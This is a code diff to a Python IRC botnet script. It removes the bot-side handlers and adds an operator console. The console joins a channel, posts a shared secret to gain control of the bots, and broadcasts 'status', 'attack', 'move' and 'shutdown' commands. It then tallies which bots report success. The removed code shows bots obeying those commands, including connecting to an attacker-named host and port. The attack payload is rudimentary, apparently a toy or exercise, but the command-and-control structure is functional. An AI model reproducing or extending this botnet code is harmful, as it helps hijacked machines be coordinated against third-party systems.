@@ -9,6 +9,7 @@ import sys
 import time
 import os
 import random
+import select
 
 #slitly modifided code for spliting messages from server
 def parsemsg(s):
@@ -56,19 +57,24 @@ def isping(s, sock):
     else:
         return False
 
+
 #needed variables to start
 hostname = ''
 port = 0
 channel = ''
 secret = ''
-username = 'bot'
+username = 'conbot'
 
 #function variables
-poweruser = []
-attackhost = ''
-attackport = ''
-botname = 'bot1'
-attacknumber = 1
+botname = 'conbot1'
+isstatus = False
+isattack = False
+ismove = False
+isshutdown = False
+isquit = False
+iscommand = True
+numsuccess = 0
+numunsuccess = 0
 
 #runtime boolean
 shutoff = False
@@ -76,6 +82,7 @@ isconnected = False
 issocket = False
 isname = False
 issent = False
+tnow = time.time()
 
 
 
@@ -97,10 +104,9 @@ random.seed(os.urandom(5))
 
 #connect to server
 ircsocket = socket.socket()
-socket.setdefaulttimeout(1000)
 
 #this must be in a loop, if disconnected try again in 5 sec
-while not shutoff:
+while not isquit:
     #loop until connected to irc server
     while not issocket:
         isconnected = False
@@ -134,18 +140,18 @@ while not shutoff:
                     break
                 while not isname:
                     ircinput = ircsocket.recv(1024).decode("utf-8")
-                    print(ircinput)
+                    #print(ircinput)
                     if isping(ircinput, ircsocket):
                         continue
                     user, prefix, command, args = parsemsg(ircinput)
                     if "NOTICE" in command:
-                           if "Welcome" in args[1]:
-                            print("got in")
+                        if "Welcome" in args[1]:
+                            print("Connected to irc")
                             isname = True
                             isconnected = True
                             break
                     elif command == "ERROR":
-                        print("there was an error")
+                        print("there was an error:", args)
                         issocket = False
                         ircsocket.close()
                         ircsocket = socket.socket()
@@ -157,10 +163,12 @@ while not shutoff:
                 if(not issocket):
                     break
                 else:
-                    print("got to here")
-                    time.sleep(10)
+                    print("waiting to join channel")
+                    time.sleep(5)
                     ircsocket.send("JOIN {}\r\n".format(channel).encode("utf-8"))
                     print("JOIN {}\r\n".format(channel))
+                    time.sleep(2)
+                    ircsocket.send("PRIVMSG {} :{}\r\n".format(channel, secret).encode("utf-8"))
         except OSError:
             print("Retrying to connect to socket")
             issocket = False
@@ -168,99 +176,80 @@ while not shutoff:
             ircsocket = socket.socket()
     if not issocket:
         continue
-    
+
+    #loop to send or recive to/from socket
     try:
-        ircinput = ircsocket.recv(1024).decode("utf-8")
+        if(time.time() > tnow and iscommand):
+            if isstatus:
+                isstatus = False
+                print("found: {} bots".format(numsuccess))
+            elif isattack:
+                isattack = False
+                print("{} successful, {} unsuccessful".format(numsuccess, numunsuccess))
+            elif ismove:
+                ismove = False
+                print("found: {} bots".format(numsuccess))
+            elif isshutdown:
+                print("{} bots has shutdown".format(numsuccess))
+                isshutdown = False
+            iscommand = False
+            print("input command:")
+        r, w, x = select.select([ircsocket, sys.stdin], [], [])
+        if ircsocket in r:
+            ircinput = ircsocket.recv(1024).decode("utf-8")
+            if not isping(ircinput, ircsocket):
+                user, prefix, command, args = parsemsg(ircinput)
+                if isstatus:
+                    if "I am a bot" in args[1]:
+                        print(user)
+                        numsuccess += 1
+                elif isattack:
+                    if "attack sucessful" in args[1]:
+                        print(user, " attack successful")
+                        numsuccess += 1
+                    elif "attack failed" in args[1]:
+                        print(user, " attack failed")
+                        numunsuccess += 1
+                elif ismove:
+                    if "moving to new server" in args[1]:
+                        print(user, "have moved")
+                        numsuccess += 1
+                elif isshutdown:
+                    if "shutting down" in args[1]:
+                        print(user, "have shutdown")
+                        numsuccess += 1
+            #read the stuff, and work it out
+        if sys.stdin in r and time.time() > tnow:
+            userinput = sys.stdin.readline()
+            print("user input is:", userinput)
+            #set command flag
+            if "status" in userinput:
+                isstatus = True
+                iscommand = True
+            elif "attack" in userinput:
+                isattack = True
+                iscommand = True
+            elif "move" in userinput:
+                ismove = True
+                iscommand = True
+            elif "shutdown" in userinput:
+                iscommand = True
+                isshutdown = True
+            elif "quit" in userinput:
+                iscommand = True
+                isquit = True
+            ircsocket.send("PRIVMSG {} :{}\r\n".format(channel, userinput).encode("utf-8"))
+            if iscommand:
+                tnow = time.time() + 5
+                numsuccess = 0
+                numunsuccess = 0
 
-        #check to see if input is a ping message, if not see if its one of the commands
-        #args[0] is the channel
-        #args[1] is the message
-        if not isping(ircinput, ircsocket):
-            user, prefix, command, args = parsemsg(ircinput)
-            #print('user: ', user)
-            if len(args) < 2:
-                pass
-
-            #if secret is used, user is added to the list of super users
-            elif secret in args[1]:
-                if user not in poweruser:
-                    poweruser.append(user)
-                    print("found poweruser: ", user)
-
-            #send a status message to all the super users
-            elif args[1] == "status\r\n" and user in poweruser:
-                try:
-                    ircsocket.send("PRIVMSG {} :I am a bot\r\n".format(user, botname).encode("utf-8"))
-                    print("PRIVMSG {} :I am a bot\r\n".format(user).encode("utf-8"))
-                except OSError:
-                    print("failed to identify self")
-
-            #attempt to attack the network
-            elif "attack" in args[1] and user in poweruser:
-                try:
-                    #split the attack command
-                    nouse, attackhost, attackport = args[1].split(' ')
-                    print("attackhost:", attackhost)
-                    print("attackport:", attackport)
-
-                    #create socket
-                    attacksocket = socket.socket()
-                    attacksocket.connect((socket.gethostbyname(attackhost), int(attackport)))
-                    attacksocket.send("{} {}".format(attacknumber, botname).encode("utf-8"))
-                    isattack = True
-
-                    #send response to user
-                    ircsocket.send("PRIVMSG {} :attack sucessful\r\n".format(user).encode("utf-8"))
-                except socket.timeout:
-                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n".format(user).encode("utf-8"))
-                except OSError:
-                    ircsocket.send("PRIVMSG {} :attack failed, cannot connect to host\r\n".format(user).encode("utf-8"))
-                except ValueError:
-                    print("not an attack command")
-                print("attack is found")
-
-            #move to a different channel
-            elif "move" in args[1] and user in poweruser:
-                try:
-                    ircsocket.send("PRIVMSG {} :moving to new server\r\n".format(user).encode("utf-8"))
-                    ircsocket.close()
-                    ircsocket = socket.socket()
-                    nouse, hostname, port, channel = args[1].split(' ')
-                    channel = '#' + channel
-                    issocket = False
-                    isname = False
-                    while not issocket:
-                        ircsocket.connect((socket.gethostbyname(hostname), int(port)))
-                        issocket = True
-                        print("new connection is made")
-                        time.sleep(3)
-                except socket.timeout:
-                    issocket = False
-                    time.sleep(5)
-                except OSError:
-                    print("cannot connect to ircserver")
-                    issocket = False
-                    time.sleep(5)
-                except ValueError:
-                    print("move command wrong")
-                print("move is found")
-
-            #close this bot
-            elif args[1] == "shutdown\r\n":
-                ircsocket.send("PRIVMSG {} :shutting down\r\n".format(user).encode("utf-8"))
-                shutoff = True
-                break
-
-
-
+    except socket.timeout:
+        continue
     except OSError:
         print("Connection to server has fail: reconnecting")
         issocket = False
         ircsocket.close()
         ircsocket = socket.socket()
-
-    #wait for command from that user
-    #if a command is issued carry it out
-
 
 
